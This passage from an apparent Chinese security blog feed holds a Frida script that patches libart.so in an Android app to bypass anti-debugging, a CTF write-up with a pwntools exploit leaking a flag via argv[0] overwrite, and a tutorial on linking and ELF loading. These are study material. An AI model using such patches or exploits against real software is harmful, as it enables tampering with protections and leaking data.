<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> frida</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></div><div class="line">    print(message)</div><div class="line"></div><div class="line">redv = frida.get_remote_device()</div><div class="line">session = redv.attach(<span class="string">"com.sf.activity"</span>)</div><div class="line"></div><div class="line">src = <span class="string">"""</span></div><div class="line">    var jnibind1 = undefined;</div><div class="line">    var jnibind2 = undefined;</div><div class="line">    var jnibind3 = undefined;</div><div class="line">    var jnibind4 = undefined;</div><div class="line">    var jnibind5 = undefined;</div><div class="line">    var jnibind6 = undefined;</div><div class="line">    var jnibind7 = undefined;</div><div class="line">    var f = Module.findBaseAddress("libart.so");</div><div class="line">    console.log("address: " + f);</div><div class="line">    jnibind1 = f.add(0x00115BC4);</div><div class="line">    var p1P = new NativePointer(jnibind1);</div><div class="line">    aryBuffer1 = Memory.readByteArray(p1P, 16);</div><div class="line">    console.log(aryBuffer1);</div><div class="line">    var vArray = [0x2D, 0xE9, 0xF0, 0x4F, 0x9B, 0xB0, 0xDF, 0xF8, 0xBC, 0x0D, 0xDF, 0xF8, 0xBC, 0x1D];</div><div class="line">    Memory.writeByteArray(p1P, vArray);</div><div class="line">    var p1P = new NativePointer(jnibind1);</div><div class="line">    aryBuffer1 = Memory.readByteArray(p1P, 16);</div><div class="line">    console.log(aryBuffer1);</div><div class="line">        </div><div class="line">"""</div><div class="line">script = session.create_script(src)</div><div class="line">script.on(<span class="string">"message"</span>, on_message)</div><div class="line">script.load()</div><div class="line">sys.stdin.read()</div></pre></td></tr></table></figure>
<p>#总结<br>这里再简述一下反调试的原理，壳APP通过Hook libdvm.so&amp;libart.so中的_Z12dvmDbgActivev&amp;_ZN3art3Dbg8GoActiveEv函数，使其跳转到自己写的函数中执行kill操作导致无法调试。<br>目前在脱壳之后遇到java反调试，皆可用对比libdvm.so&amp;libart.so寻找差异点将其修复绕过反调试，感兴趣的大佬可以通过其他被hook的函数研究加固或者函数抽取的原理。</p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>反调试</tag>
        <tag>反反调试</tag>
      </tags>
  </entry>
  <entry>
    <title>栈溢出之利用__stack_chk_fail</title>
    <url>/2017/03/04/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8B%E5%88%A9%E7%94%A8-stack-chk-fail/</url>
    <content><![CDATA[<p>程序的主函数很明显_IO_gets存在栈溢出。<br><a id="more"></a><br>查看开启的保护机制，开了一大堆。。。</p>
<pre><code>gdb-peda$ checksec 
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
</code></pre><p>这题是国外的一个CTF题目，他利用的是fortify的报错泄露信息，在栈溢出的时候，数组越界写入，导致 canary值被修改。在函数退出时检查canary，发现canary被修改，函数不能安全返回，call到__stack_chk_fail打印argv[0]这个指针指向的字符串，默认是程序的名字。所以如果我们把它覆盖为flag的地址时，它就会把flag给打印出来。</p>
<pre><code>void
__attribute__ ((noreturn))
__stack_chk_fail (void)
  {
     __fortify_fail (&quot;stack smashing detected&quot;);
  }
void
__attribute__ ((noreturn)) internal_function
__fortify_fail (const char *msg)
  {
    /* The loop is added only to keep gcc happy.  */
    while (1)
      __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,
              msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
  }
</code></pre><p>我们可以自己尝试将程序溢出</p>
<pre><code>@ubuntu:~/Desktop$ python -c &apos;print &quot;A&quot;*0x200+&quot;\n&quot;+&quot;a&quot;&apos;| ./smashes
Hello!
What&apos;s your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
Please overwrite the flag: Thank you, bye!
*** stack smashing detected ***: ./smashes terminated
Aborted (core dumped)
</code></pre><p>下一步就是计算argv[0]到缓冲区的距离</p>
<pre><code>gdb-peda$ b *0x0040080e
Breakpoint 1 at 0x40080e
gdb-peda$ r
Starting program: /home/longlong/Desktop/smashes 
Hello!
What&apos;s your name? [----------------------------------registers-----------------------------------]
RAX: 0x19 
RBX: 0x0 
RCX: 0x7ffff7b00710 (&lt;__write_nocancel+7&gt;:    cmp    rax,0xfffffffffffff001)
RDX: 0x19 
RSI: 0x7ffff7dd59e0 --&gt; 0x0 
RDI: 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 
RBP: 0x0 
RSP: 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 
RIP: 0x40080e (call   0x4006c0 &lt;_IO_gets@plt&gt;)
R8 : 0x7ffff7fdb740 (0x00007ffff7fdb740)
R9 : 0x400934 (&quot;Hello!\nWhat&apos;s your name? &quot;)
R10: 0x7ffff7fdb740 (0x00007ffff7fdb740)
R11: 0x246 
R12: 0x4006ee (xor    ebp,ebp)
R13: 0x7fffffffdec0 --&gt; 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400804:    xor    eax,eax
   0x400806:    call   0x4006b0 &lt;__printf_chk@plt&gt;
   0x40080b:    mov    rdi,rsp
=&gt; 0x40080e:    call   0x4006c0 &lt;_IO_gets@plt&gt;
   0x400813:    test   rax,rax
   0x400816:    je     0x40089f
   0x40081c:    mov    rdx,rsp
   0x40081f:    mov    esi,0x400960
Guessed arguments:
arg[0]: 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 
0008| 0x7fffffffdcb8 --&gt; 0x7ffff7ff74c0 --&gt; 0x7ffff7a15000 --&gt; 0x10102464c457f 
0016| 0x7fffffffdcc0 --&gt; 0x7fffffffde10 --&gt; 0x0 
0024| 0x7fffffffdcc8 --&gt; 0x7ffff7ff7a10 --&gt; 0x400458 (&quot;GLIBC_2.2.5&quot;)
0032| 0x7fffffffdcd0 --&gt; 0x1 
0040| 0x7fffffffdcd8 --&gt; 0x7ffff7ffe520 --&gt; 0x7ffff7ffe480 --&gt; 0x7ffff7ff79c8 --&gt; 0x7ffff7ffe1c8 --&gt; 0x0 
0048| 0x7fffffffdce0 --&gt; 0x7ffff7ffe1c8 --&gt; 0x0 
0056| 0x7fffffffdce8 --&gt; 0x7ffff7de4961 (&lt;_dl_lookup_symbol_x+305&gt;:    cmp    eax,0x0)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000000000040080e in ?? ()
gdb-peda$ find /home
Searching for &apos;/home&apos; in: None ranges
Found 8 results, display max 8 items:
[stack] : 0x7fffffffe253 (&quot;/home/longlong/Desktop/smashes&quot;)
[stack] : 0x7fffffffeafc (&quot;/home/longlong/.virtualenvs&quot;)
[stack] : 0x7fffffffeb69 (&quot;/home/longlong/Devel&quot;)
[stack] : 0x7fffffffec50 (&quot;/home/longlong/.virtualenvs&quot;)
[stack] : 0x7fffffffec70 (&quot;/home/longlong/Desktop&quot;)
[stack] : 0x7fffffffed82 (&quot;/home/longlong&quot;)
[stack] : 0x7fffffffefa5 (&quot;/home/longlong/.Xauthority&quot;)
[stack] : 0x7fffffffefd9 (&quot;/home/longlong/Desktop/smashes&quot;)
gdb-peda$ find 0x7fffffffe253
Searching for &apos;0x7fffffffe253&apos; in: None ranges
Found 2 results, display max 2 items:
   libc : 0x7ffff7dd4018 --&gt; 0x7fffffffe253 (&quot;/home/longlong/Desktop/smashes&quot;)
[stack] : 0x7fffffffdec8 --&gt; 0x7fffffffe253 (&quot;/home/longlong/Desktop/smashes&quot;) 
gdb-peda$ distance $rsp 0x7fffffffdec8
From 0x7fffffffdcb0 to 0x7fffffffdec8: 536 bytes, 134 dwords
</code></pre><p>通过gdb计算可以知道argv[0]到缓冲区的距离是0x218字节。</p>
<p>查找发现flag同样存储在制度存储器0x400d20这个位置</p>
<pre><code>gdb-peda$ find PCTF
Searching for &apos;PCTF&apos; in: None ranges
Found 2 results, display max 2 items:
smashes : 0x400d20 (&quot;PCTF{Here&apos;s the flag on server}&quot;)
smashes : 0x600d20 (&quot;PCTF{Here&apos;s the flag on server}&quot;)
</code></pre><p>本地覆盖结果如下：</p>
<pre><code>@ubuntu:~/Desktop$ python -c &apos;print &quot;a&quot;*0x218+&quot;\x20\x0d\x40\x00\x00\x00\x00\x00&quot;+&quot;\n&quot;+&quot;a&quot;&apos; | ./smashes
Hello!
What&apos;s your name? Nice to meet you, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 
Please overwrite the flag: Thank you, bye!
*** stack smashing detected ***: PCTF{Here&apos;s the flag on server} terminated
Aborted (core dumped)
</code></pre><p>提示flag在服务器上，然而远程连接过去是不会成功的。</p>
<p>注意不要用原来flag的地址覆盖，因为原来存储flag的地方会被overwrite。但是由于ELF的映射方式，此flag会被映射两次，另外一个地方flag的内容不会变。</p>
<p>原因是<strong>stack_chk_fail会调用</strong>libc_message</p>
<pre><code>void
__libc_message (int do_abort, const char *fmt, ...)
{
  va_list ap; 
  int fd = -1; 
  va_start (ap, fmt);
  /* Open a descriptor for /dev/tty unless the user explicitly
     requests errors on standard error.  */
  const char *on_2 = __libc_secure_getenv (&quot;LIBC_FATAL_STDERR_&quot;);
  if (on_2 == NULL || *on_2 == &apos;\0&apos;)
    fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);
  if (fd == -1) 
    fd = STDERR_FILENO;
  /*......*/
}
</code></pre><p>如果LIBC_FATAL<em>STDERR</em>环境变量没有设置或者为空，stderr会redirect到_PATH_TTY，通常是/dev/tty，因此错误信息将不会输出到stderr而是服务端可见的设备。<br>所以我们必须设置这个环境变量，正好可以用这个环境变量去覆盖flag的内容。</p>
<p>最终exp:</p>
<pre><code>from pwn import *
old_flag_addr = 0x600d20
new_flag_addr = 0x400d20
#p = process(&apos;./smashes&apos;)
p = remote(&apos;pwn.jarvisoj.com&apos;, 9877)
p.recvuntil(&quot;name?&quot;)
payload = &quot;a&quot;*0x218 + p64(new_flag_addr) 
payload += p64(0) + p64(old_flag_addr)
p.sendline(payload)
p.recvuntil(&quot;flag: &quot;)
env = &quot;LIBC_FATAL_STDERR_=1&quot;
p.sendline(env)
flag = p.recv()
print flag
</code></pre><p>根据glibc的源码可知，只要程序开了canary栈保护，就可以覆盖argv[0]来泄露想要的信息(&amp;set LIBC_FATAL<em>STDERR</em>=1)。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>程序的动态链接和静态链接</title>
    <url>/2016/08/07/%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%92%8C%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A51/</url>
    <content><![CDATA[<p>参考自：This is an <a href="http://www.xuebuyuan.com/1730287.html" target="_blank" rel="external">http://www.xuebuyuan.com/1730287.html</a><br><a id="more"></a> </p>
<h2 id="一、程序编译链接的整体流程"><a href="#一、程序编译链接的整体流程" class="headerlink" title="一、程序编译链接的整体流程"></a>一、程序编译链接的整体流程</h2><p>通常我们使用gcc来生成可执行程序，命令为：gcc hello.c，默认生成可执行文件a.out</p>
<p>其实编译（包括链接）的命令：gcc hello.c 可分解为如下4个大的步骤：</p>
<pre><code>预处理(Preprocessing)
编译(Compilation)
汇编(Assembly)
链接(Linking)
</code></pre><p><img src="http://smilejay.b0.upaiyun.com/wp-content/uploads/2012/01/gcc_compilation_stages.jpg" alt=""><br>gcc compilation</p>
<h3 id="1-预处理-Preproceessing"><a href="#1-预处理-Preproceessing" class="headerlink" title="1.       预处理(Preproceessing)"></a>1.       预处理(Preproceessing)</h3><pre><code>预处理的过程主要处理包括以下过程：
将所有的#define删除，并且展开所有的宏定义
处理所有的条件预编译指令，比如#if #ifdef #elif #else #endif等
处理#include 预编译指令，将被包含的文件插入到该预编译指令的位置。
删除所有注释 “//”和”/* */”.
添加行号和文件标识，以便编译时产生调试用的行号及编译错误警告行号。
保留所有的#pragma编译器指令，因为编译器需要使用它们
</code></pre><p>通常使用以下命令来进行预处理：</p>
<p>gcc -E hello.c -o hello.i</p>
<p>参数-E表示只进行预处理 或者也可以使用以下指令完成预处理过程</p>
<p>cpp hello.c &gt; hello.i      /<em>  cpp – The C Preprocessor  </em>/</p>
<p>直接cat hello.i 你就可以看到预处理后的代码</p>
<h3 id="2-编译-Compilation"><a href="#2-编译-Compilation" class="headerlink" title="2.       编译(Compilation)"></a>2.       编译(Compilation)</h3><p>编译过程就是把预处理完的文件进行一系列的词法分析，语法分析，语义分析及优化后生成相应的汇编代码。</p>
<p>$gcc –S hello.i –o hello.s</p>
<p>或者</p>
<p>$ /usr/lib/gcc/i486-linux-gnu/4.4/cc1 hello.c</p>
<p>注：现在版本的GCC把预处理和编译两个步骤合成一个步骤，用cc1工具来完成。gcc其实是后台程序的一些包装，根据不同参数去调用其他的实际处理程序，比如：预编译编译程序cc1、汇编器as、连接器ld</p>
<h3 id="3-汇编-Assembly"><a href="#3-汇编-Assembly" class="headerlink" title="3.       汇编(Assembly)"></a>3.       汇编(Assembly)</h3><p>汇编器是将汇编代码转变成机器可以执行的命令，每一个汇编语句几乎都对应一条机器指令。汇编相对于编译过程比较简单，根据汇编指令和机器指令的对照表一一翻译即可。</p>
<p>$ gcc –c hello.c –o hello.o</p>
<p>或者</p>
<p>$ as hello.s –o hello.co</p>
<p>由于hello.o的内容为机器码，不能以普通文本形式的查看（vi 打开看到的是乱码）。</p>
<h3 id="4-链接-Linking"><a href="#4-链接-Linking" class="headerlink" title="4.       链接(Linking)"></a>4.       链接(Linking)</h3><p>通过调用链接器ld来链接程序运行需要的一大堆目标文件，以及所依赖的其它库文件，最后生成可执行文件。</p>
<p>ld -static crt1.o crti.o crtbeginT.o hello.o -start-group -lgcc -lgcc_eh -lc-end-group crtend.o crtn.o (省略了文件的路径名)。</p>
<p>helloworld的大体编译和链接过程就是这样了，那么编译器和链接器到底做了什么呢？</p>
<p>编译过程可分为6步：扫描（词法分析）、语法分析、语义分析、源代码优化、代码生成、目标代码优化。</p>
<p>词法分析：扫描器（Scanner）将源代的字符序列分割成一系列的记号（Token）。lex工具可实现词法扫描。</p>
<p>语法分析：语法分析器将记号（Token）产生语法树（Syntax Tree）。yacc工具可实现语法分析(yacc: Yet Another Compiler Compiler)。</p>
<p>语义分析：静态语义（在编译器可以确定的语义）、动态语义（只能在运行期才能确定的语义）。</p>
<p>源代码优化：源代码优化器(Source Code Optimizer)，将整个语法书转化为中间代码（Intermediate Code）（中间代码是与目标机器和运行环境无关的）。中间代码使得编译器被分为前端和后端。编译器前端负责产生机器无关的中间代码；编译器后端将中间代码转化为目标机器代码。</p>
<p>目标代码生成：代码生成器(Code Generator).</p>
<p>目标代码优化：目标代码优化器(Target Code Optimizer)。</p>
<p>链接的主要内容是把各个模块之间相互引用的部分处理好，使得各个模块之间能够正确地衔接。</p>
<p>链接的主要过程包括：地址和空间分配（Address and Storage Allocation），符号决议（Symbol Resolution），重定位（Relocation）等。</p>
<p>链接分为静态链接和动态链接。</p>
<p>静态链接是指在编译阶段直接把静态库加入到可执行文件中去，这样可执行文件会比较大。</p>
<p>而动态链接则是指链接阶段仅仅只加入一些描述信息，而程序执行时再从系统中把相应动态库加载到内存中去。</p>
<p>静态链接的大致过程如下图所示：</p>
<p><img src="http://smilejay.b0.upaiyun.com/wp-content/uploads/2012/01/linking.jpg" alt=""></p>
<p>static linking</p>
<h2 id="二、目标文件的样子（以linux下的elf文件格式为例）"><a href="#二、目标文件的样子（以linux下的elf文件格式为例）" class="headerlink" title="二、目标文件的样子（以linux下的elf文件格式为例）"></a>二、目标文件的样子（以linux下的elf文件格式为例）</h2><p><img src="http://img.my.csdn.net/uploads/201302/02/1359777256_5685.jpg" alt=""></p>
<p>夹在ELF头和节头部表之间的都是节。一个典型的ELF可重定位目标文件包含下面几个节：</p>
<pre><code>.text：已编译程序的机器代码。
.rodata：只读数据，比如printf语句中的格式串和开关（switch）语句的跳转表。
.data：已初始化的全局C变量。局部C变量在运行时被保存在栈中，既不出现在.data中，也不出现在.bss节中。
.bss：未初始化的全局C变量。在目标文件中这个节不占据实际的空间，它仅仅是一个占位符。目标文件格式区分初始化和未初始化变量是为了空间效率在：在目标文件中，未初始化变量不需要占据任何实际的磁盘空间。
.symtab：一个符号表（symbol table），它存放在程序中被定义和引用的函数和全局变量（包括引用到的外部变量和函数，不含有局部变量）的信息。一些程序员错误地认为必须通过-g选项来编译一个程序，得到符号表信息。实际上，每个可重定位目标文件在.symtab中都有一张符号表。然而，和编译器中的符号表不同，.symtab符号表不包含局部变量的表目。
.rel.text：当链接噐把这个目标文件和其他文件结合时，.text节中的许多位置都需要修改。一般而言，任何调用外部函数或者引用全局变量（包括本目标文件内的全局变量，因为在链接时要多个目标文件的相同段合并，这样数据的地址就会改变，所以要重定位）的指令都需要修改。另一方面调用本地函数的指令则不需要修改。注意，可执行目标文件中并不需要重定位信息，因此通常省略，除非使用者显式地指示链接器包含这些信息。
.rel.data：被模块定义或引用的任何全局变量的信息。一般而言，任何已初始化全局变量的初始值是全局变量或者外部定义函数的地址都需要被修改。
.debug：一个调试符号表，其有些表目是程序中定义的局部变量和类型定义，有些表目是程序中定义和引用的全局变量，有些是原始的C源文件。只有以-g选项调用编译驱动程序时，才会得到这张表。
.line：原始C源程序中的行号和.text节中机器指令之间的映射。只有以-g选项调用编译驱动程序时，才会得到这张表。
.strtab：一个字符串表，其内容包括.symtab和.debug节中的符号表，以及节头部中的节名字。字符串表就是以null结尾的字符串序列。
</code></pre><p>旁注：为什么未初始化的数据称为.bss?</p>
<p>用术语.bss来表示未初始化的数据是很普遍的。它起始于IBM 704汇编语言（大约在1957年）中”块存储开始（Block Storage Start）“指令的首字母缩写，并沿用至今。一个记住区分.data和.bss节的简单方法是把“bss”看成是“更好地节省空间（Better Save Space）！“的缩写。</p>
<h2 id="三、静态链接"><a href="#三、静态链接" class="headerlink" title="三、静态链接"></a>三、静态链接</h2><p>虚拟存储器是建立在主存–辅存物理结构基础上，有附加的硬件装置及操作系统存储管理软件组成的一种存储体系。</p>
<p><img src="http://hi.csdn.net/attachment/201011/28/0_1290943844z9zN.gif" alt=""></p>
<p>顾名思义，虚拟存储器是虚拟的存储器，它其实是不存在的，而仅仅是由一些硬件和软件管理的一种“系统”。他提供了三个重要的能力：<br>1，它将主存看成一个存储在磁盘上的地址空间的高速缓存，在主存中只保存活动区域，并根据需要在磁盘和主存之间来回传送数据（这里存在“交换空间”以及“页面调度”等概念），通过这种方式，高效地利用主存；2，它为每个进程提供了统一的地址空间（以虚拟地址编址），从而简化了存储器管理；3，操作系统会为每个进程提供独立的地址空间，从而保护了每个进程的地址空间不被其他进程破坏。 </p>
<p>虚拟存储器与虚拟地址空间是两个不同的概念：虚拟存储器是假想的存储器，而虚拟存储空间是假想的内存。它们之间的关系应该与主存储器与内存空间之间的关系类似。</p>
<p>链接部分：</p>
<p>链接就是将不同部分的代码和数据收集和组合成一个单一文件的过程，也就是把不同目标文件合并成最终可执行文件的过程。当然，务必知道：这个过程不涉及内存。</p>
<h4 id="链接可以分为三种情形："><a href="#链接可以分为三种情形：" class="headerlink" title="链接可以分为三种情形："></a>链接可以分为三种情形：</h4><pre><code>1，编译时链接，也就是我们常说的静态链接；
2，装载时链接；
3，运行时链接。装载时链接和运行时链接合称为动态链接。在此，我们的链接部分将主要讲述静态链接，而装载时链接我们放在装载部分讲，运行时链接忽略。
</code></pre><h3 id="1、什么是静态链接？"><a href="#1、什么是静态链接？" class="headerlink" title="1、什么是静态链接？"></a>1、什么是静态链接？</h3><p>静态链接就是将多个目标文件组合在一起形成一个可执行文件，如将a.o 和 b.o 链接在一起形成 可执行文件ab。</p>
<h3 id="2、静态链接的过程包括哪几个部分？"><a href="#2、静态链接的过程包括哪几个部分？" class="headerlink" title="2、静态链接的过程包括哪几个部分？"></a>2、静态链接的过程包括哪几个部分？</h3><pre><code>静态链接包括两个大部分：一是空间和地址的分配；二是符号解析和重定位
</code></pre><p>####（1）空间和地址的分配</p>
<p>编译器在将a.o 和 b.o 是如何合并在一起的？？</p>
<p>第二种方法就是 相似段合并：顾名思义 就是把不同目标文件的相同名字的段合并成一个段，如下图：</p>
<p><img src="http://images2015.cnblogs.com/blog/376860/201608/376860-20160806114729590-1085295555.png" alt=""></p>
<p>　　　　　　　　　　　　　　　　　　　　　　图1</p>
<p>这是编译器实际进行合并目标文件的策略。</p>
<pre><code>/*a.c*/
extern int shared;
int main()
{
int a = 100;
swap(&amp;a,&amp;shared);
}

/*b.c*/
int shared = 1;
void swap(int *a,int *b)
{
   *a ^= *b ^= *a ^= *b;
}  
</code></pre><p>编译这两个文件得到“a.o”和“b.o”两个目标文件</p>
<p>§gcc -c a.c b.c</p>
<p>从代码中可以看到三个符号：share，swap和main。</p>
<p>静态链接的整个过程分为两步:</p>
<p>第一步：空间和地址分配。扫描所有的输入目标文件，获得他们的各个段的长度、属性和位置，并且将输入目标文件中的符号表中所有的符号定义和符号引用收集起来，统一放到一个全局符号表。这样，连接器将能够获得所有输入目标文件的段长度，并且将它们合并，计算出输出文件中各个段合并后的长度与位置，并建立映射关系。</p>
<p>这里可能会有一个问题：建立了什么样的映射关系。如上面的图1，你可能就会有所了解。映射关系就是指可执行文件与进程虚拟地址空间之间的映射。那么，这里程序还没有执行，更不会出现进程，哪里来的进程地址空间呢？此时虚拟存储器便发挥了很大的作用：虽然此时没有进程，但是每个进程的虚拟地址空间的格式都是一致的。所以，为可执行文件的每个段甚至每个符号符号分配地址也就不会有什么错了。注意：在链接之前，目标文件中的所有段的虚拟地址都是0，因为虚拟空间还没有被分配，默认都为0.等到链接之后，可执行文件中的各个段已经都被分配到了相应的虚拟地址</p>
<p>第二步：符号解析与重定位</p>
<p>首先，符号解析。解析符号就是将每个符号引用与它输入的可重定位目标文件中的符号表中的一个确定的符号定义联系起来。</p>
<p>若找不到，则出现编译时错误。   </p>
<p>其次是重定位；</p>
<p>不同的处理器指令对于地址的格式和方式都不一样。我们这里采用的是32位的x86处理器，介绍两种寻址方式。</p>
<h2 id="X86基本重定位类型"><a href="#X86基本重定位类型" class="headerlink" title="X86基本重定位类型"></a>X86基本重定位类型</h2><h2 id="宏定义-值-重定位修正方法"><a href="#宏定义-值-重定位修正方法" class="headerlink" title="宏定义                    值             重定位修正方法"></a>宏定义                    值             重定位修正方法</h2><h2 id="R-386-32-1-绝对寻址修正S-A"><a href="#R-386-32-1-绝对寻址修正S-A" class="headerlink" title="R_386_32                  1             绝对寻址修正S + A"></a>R_386_32                  1             绝对寻址修正S + A</h2><h2 id="R-386-PC32-2-相对寻址修正S-A-P"><a href="#R-386-PC32-2-相对寻址修正S-A-P" class="headerlink" title="R_386_PC32                2             相对寻址修正S + A - P"></a>R_386_PC32                2             相对寻址修正S + A - P</h2><p>注：</p>
<p>A：保存在被修正位置的值，对于32位cpu的话，采用<br>R_386_PC32寻址的话<br>它应该为0xFFFFFFFC即-4，它是代表地址的四个字节；而采用<br>R_386_32寻址，它应该为0.</p>
<p>P：被修正的位置。考虑以下程序</p>
<p>…</p>
<p>1023: 11 11 11</p>
<p>1026:e8<br>fc<br> ff ff ff</p>
<p>102b: 11 11 11</p>
<p>…</p>
<p>上述蓝色fc标记处即是被修正的位置，即0x1027.</p>
<p>S：符号的实际地址。也就是第一步中空间和地址分配时得到的符号虚拟地址。</p>
<p>举例来说吧！链接成的可执行文件中，假设main函数的虚拟地址为0x1000，swap函数的虚拟地址为0x2000；shared变量的虚拟地址为0x3000;</p>
<p>绝对地址修正：对shared变量的地址修正。</p>
<p>l<br>S：shared的实际地址为0x3000；</p>
<p>l<br>A：被修正位置的值，即0.</p>
<p>所以最后这个重定位修正地址为：0x3000，不变！</p>
<p>相对寻址修正：对符号“swap”进行修正。</p>
<p>l<br>S：符号swap的实际地址，即0x2000；</p>
<p>l<br>A：被修正位置的值，即0xFFFFFFFC（-4）；</p>
<p>l<br>P：被修正位置，及0x1027</p>
<p>最后的重定位修正地址为：S + A -P = 0x2000 +（-4）- 0x1027 = 0xFD5.即修正后的程序为：</p>
<p>…</p>
<p>1023: 11 11 11</p>
<p>1026:e8<br>d5 0f 00 00</p>
<p>102b: 11 11 11</p>
<p>…</p>
<p>发现熟悉的规则了吗？下一条指令（PC）的地址为0x102b，加上这个修正值正好等于0x2000，</p>
<p>0x102b + 0xFD5 = 0x2000，刚好是swap函数的地址。</p>
<p><img src="http://hi.csdn.net/attachment/201011/28/0_1290945325g9vI.gif" alt=""></p>
<p>以上内容没有涉及到c标准库，仅仅是自己实现的两个c语言程序之间的链接状况，也就是“程序里面的printf怎么处理”没有说明。这里，我们就要提及“静态库”的概念。其实一个静态库可以简单地看成一组目标文件的集合，即很多目标文件经过压缩打包后形成的一个文件。与静态库链接的过程是这样的：ld链接器自动查找全局符号表，找到那些为决议的符号，然后查出它们所在的目标文件，将这些目标文件从静态库中“解压”出来，最终将它们链接在一起成为一个可执行文件。也就是说只有少数几个库和目标文件被链接入了最终的可执行文件，而非所有的库一股脑地被链接进了可执行文件。</p>
<h2 id="四、装载："><a href="#四、装载：" class="headerlink" title="四、装载："></a>四、装载：</h2><p>以Linux内核装载ELF为例简述一下装载过程。当我们在Linux系统的bash下输入一个命令执行某个ELF程序时，在用户层面，bash进程会调用fork()系统调用创建一个新的进程，然后新的进程调用execve()来执行指定的ELF文件，原先的bash进程继续返回等待刚才启动时新进程结束，然后继续等待用户输入命令。这里需注意，随着一个新进程的出现，操作系统会为它创建一个独立的虚拟地址空间。</p>
<p>【创建虚拟地址空间】我们知道一个虚拟空间由一组映射函数将虚拟空间的各个页映射到相应的物理空间，那么创建一个虚拟空间实际上并不是创建空间而是创建映射函数所需要的数据结构。举例来说，在x86的Linux下创建虚拟地址空间实际上只是分配一个页目录（页表）就可以了，甚至不设置页映射关系，这些映射关系等到后面程序发生“缺页”时在进行设置。</p>
<p>在进入execve()系统调用之后，Linux内核就开始进行真正的装载工作。在内核中，execve()系统调用相应的入口是sys_execve(),作用：参数的检查复制；调用do_execve(),流程：查找被执行的文件，读取文件的前128个字节以判断文件的格式是elf还是其它；调用search_binary_handle(),流程：通过判断文件头部的魔数确定文件的格式，并且调用相应的装载处理程序。ELF可执行文件的装载处理过程叫load_elf_binary(),它的主要步骤如下：</p>
<p>1，检查ELF可执行文件格式的有效性，比如魔数、程序头表中段的数量。</p>
<p>2，寻找动态链接的“.interp”段，找到动态链接器的路径，以便于后面动态链接时会用上。</p>
<p>3，读取可执行文件的程序头，并且创建虚拟空间与可执行文件的映射关系。</p>
